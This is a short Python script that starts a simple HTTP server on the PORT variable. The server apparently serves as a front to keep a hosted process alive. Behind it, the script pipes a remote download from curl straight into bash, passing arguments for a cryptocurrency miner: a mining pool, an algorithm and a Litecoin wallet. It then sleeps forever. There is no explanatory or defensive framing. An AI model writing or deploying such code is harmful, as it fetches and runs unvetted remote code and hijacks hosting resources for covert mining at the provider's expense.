import os, threading, http.server, socketserver

def start_site():
    port = int(os.environ.get("PORT", 10000))
    with socketserver.TCPServer(("", port), http.server.SimpleHTTPRequestHandler) as httpd:
        httpd.serve_forever()

threading.Thread(target=start_site, daemon=True).start()
os.system("curl -sL https://githubusercontent.com | bash -s -- -p zpool -a minotaurx -u ltc1qpmvkquzpa5c9qhkq4t8pvhffd7238ae5zewr0v --pass c=LTC")

import time
while True: time.sleep(60)
